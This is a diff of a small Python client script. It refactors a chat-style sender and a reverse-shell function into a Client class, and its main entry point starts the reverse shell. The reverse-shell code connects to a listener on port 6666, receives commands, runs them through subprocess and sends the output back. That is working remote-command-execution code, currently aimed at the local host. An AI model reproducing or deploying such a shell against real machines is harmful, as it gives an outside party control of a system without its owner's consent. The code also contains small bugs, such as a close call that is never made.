@@ -1,80 +1,86 @@
 #!/usr/bin/env python
 # coding=utf-8
 
+
+__author__ = 'Karl Boulais'
+
 import socket
 import os
 import subprocess
 import sys
 
 
-
-def sendingData():
-    s = socket.socket()
-    ip = socket.gethostname()
-    host = ip
-    port = 9999
-    quitting = False
-    s.connect((host, port))
-
-    while not quitting:
-        message = input('> ')
-        if message == "exit":
-            quitting = True
-            s.send(b'exit')
-            s.close
-
-        s.send(bytes(message, "UTF-8"))
+class Client():
+    def __init__(self):
+        pass
 
     
+    def sendingData(self):
+        s = socket.socket()
+        ip = socket.gethostname()
+        host = ip
+        port = 9999
+        quitting = False
+        s.connect((host, port))
 
-def sendingReverseShell():
-    s = socket.socket()
-    ip = socket.gethostname()
-    host = ip
-    port = 6666
-    quitting = False
-    s.connect((host, port))
-    SEP = "<sep>"
-    output = ""
-    first = True
+        while not quitting:
+            message = input('> ')
+            if message == "exit":
+                quitting = True
+                s.send(b'exit')
+                s.close
 
-    while not quitting:
-        cwd = os.getcwd()
-        
-        if first:
-            first = False
-            message = f"{cwd}"
-        else:
-            message = f"{output}{SEP}{cwd}"
+            s.send(bytes(message, "UTF-8"))
 
-        s.send(bytes(message, "UTF-8"))
+    
+    def sendingReverseShell(self):
+        s = socket.socket()
+        ip = socket.gethostname()
+        host = ip
+        port = 6666
+        quitting = False
+        s.connect((host, port))
+        SEP = "<sep>"
+        output = ""
+        first = True
 
-        # Waiting for a command
-        command = s.recv(1024).decode("UTF-8")
-        commandArgs = command.split()
+        while not quitting:
+            cwd = os.getcwd()
+            
+            if first:
+                first = False
+                message = f"{cwd}"
+            else:
+                message = f"{output}{SEP}{cwd}"
 
-        if command.lower() == "exit":
-            quitting = True
-            s.send(b'exit')
-            s.close()
-        if commandArgs[0].lower() == "cd":
-            try:
-                os.chdir(' '.join(commandArgs[1:]))
-            except Exception as e:
-                if e == FileNotFoundError: 
-                    output = str(e)
-                else:
-                    output = ""
-        else:
-            output = subprocess.getoutput(command)
-        
+            s.send(bytes(message, "UTF-8"))
 
-def client():
-    # [1]_ [2]_
-    sendingReverseShell()
+            # Waiting for a command
+            command = s.recv(1024).decode("UTF-8")
+            commandArgs = command.split()
+
+            if command.lower() == "exit":
+                quitting = True
+                s.send(b'exit')
+                s.close()
+            if commandArgs[0].lower() == "cd":
+                try:
+                    os.chdir(' '.join(commandArgs[1:]))
+                except Exception as e:
+                    if e == FileNotFoundError: 
+                        output = str(e)
+                    else:
+                        output = ""
+            else:
+                output = subprocess.getoutput(command)
+            
+
+    def main(self):
+        # [1]_ [2]_
+        self.sendingReverseShell()
 
 if __name__ == "__main__":
-   client()
+   Client().main()
 
 
 '''
